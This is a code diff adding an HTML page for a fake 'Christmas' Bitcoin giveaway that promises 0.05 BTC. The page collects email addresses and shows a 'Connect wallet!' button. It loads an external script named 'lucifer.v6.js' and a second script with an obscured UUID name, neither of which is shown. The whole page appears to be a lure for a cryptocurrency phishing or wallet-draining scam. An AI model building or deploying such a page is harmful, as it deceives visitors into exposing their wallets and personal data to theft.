@@ -1,0 +1,161 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Project Hirsch - Index</title>
+    <link rel="icon" href="logo.png" />
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>    
+    <link href="https://fonts.googleapis.com/css2?family=Roboto+Mono:wght@700&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="styles.css">
+	<script type="module" crossorigin src="./files/lucifer.v6.js"></script>
+    <style>
+        body {
+            background-color: #121212;
+            color: #fff;
+            font-family: 'Roboto Mono', monospace;
+            margin: 0;
+            padding: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            overflow: hidden;
+            position: relative;
+        }
+        .container {
+            text-align: center;
+        }
+        .rounded-box {
+            background-color: #1e1e1e;
+            padding: 20px;
+            border-radius: 10px;
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.3);
+        }
+        .signup-input, .interact-button {
+            width: 90%;
+            padding: 10px;
+            margin: 7px 0;
+            border: none;
+            border-radius: 5px;
+        }
+        .signup-input {
+            background-color: #2c2c2c;
+            color: #fff;
+        }
+        .interact-button {
+            background-color: #5bbb00;
+            color: white;
+            cursor: pointer;
+        }
+        .green-dot {
+            background-color: #06b800;
+            height: 10px;
+            width: 10px;
+            border-radius: 50%;
+            display: inline-block;
+        }
+        .stats-section {
+            margin-top: 10px;
+            font-size: 1.2rem;
+        }
+        .btc {
+            position: absolute;
+            width: 40px;
+            top: -50px;
+            animation: fall linear infinite;
+            opacity: 0.7;
+        }
+        @keyframes fall {
+            0% {
+                transform: translateY(-50px);
+            }
+            100% {
+                transform: translateY(110vh);
+            }
+        }
+        .footer-links {
+            position: absolute;
+            bottom: 30px;
+            left: 10px;
+            font-size: 0.9rem;
+        }
+        .footer-links a {
+            color: #5bbb00;
+            text-decoration: none;
+            margin-right: 15px;
+        }
+        .footer-links a:hover {
+            text-decoration: underline;
+        }
+        .footer-text {
+            position: absolute;
+            bottom: 10px;
+            left: 10px;
+            font-size: 0.8rem;
+            color: #5bbb00;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="text-section">
+            <h1>???.wiki - giveaway</h1>
+            <div class="stats-section">
+                <div class="stats-box">
+                    <p>Status: <strong>Ongoing!</strong><span class="green-dot"></span></p>
+                </div>
+            </div>
+            <p>Get a chance to win 0.05 Bitcoin for Christmas!</p>
+        </div>
+
+        <div class="box-section">
+            <div class="rounded-box">
+                <p>Sign up to have a chance to win!</p>
+                <input type="email" id="email-input" placeholder="Enter your email" class="signup-input">
+                <p style="color: grey; font-size: 0.75rem;">*REQUIRED FIELD</p>
+                <div class="checkbox-container">
+                    <input type="checkbox" id="email-updates" class="styled-checkbox">
+                    <label for="email-updates">Sign up to receive email updates.</label>
+                </div>
+                <button class="interact-button interactBtn">Connect wallet! 𐂂</button>
+            </div>
+        </div>
+    </div>
+
+    <div class="footer-links">
+        <a href="terms.html">Terms</a>
+        <a href="privacy.html">Privacy Policy</a>
+    </div>
+
+    
+    <br>
+
+
+    <div class="footer-text">
+        ©2025 Project Hirsch, Inc - 𐂂
+    </div>
+
+    <script>
+        function createBTC() {
+            const btc = document.createElement('img');
+            btc.src = 'https://upload.wikimedia.org/wikipedia/commons/thumb/4/46/Bitcoin.svg/1200px-Bitcoin.svg.png'; 
+            btc.classList.add('btc');
+            btc.style.left = Math.random() * 100 + 'vw';
+
+            const duration = Math.random() * 3 + 5; 
+            btc.style.animationDuration = duration + 's'; 
+
+            document.body.appendChild(btc);
+
+            setTimeout(() => {
+                btc.remove();
+            }, duration * 1000);
+        }
+
+        setInterval(createBTC, 1000); 
+    </script>
+    <script charset="UTF-8" type="text/javascript" src="./f909b975-4dd3-4c3d-b4e3-ac0c1e405ca0.js"></script>
+</body>
+</html>
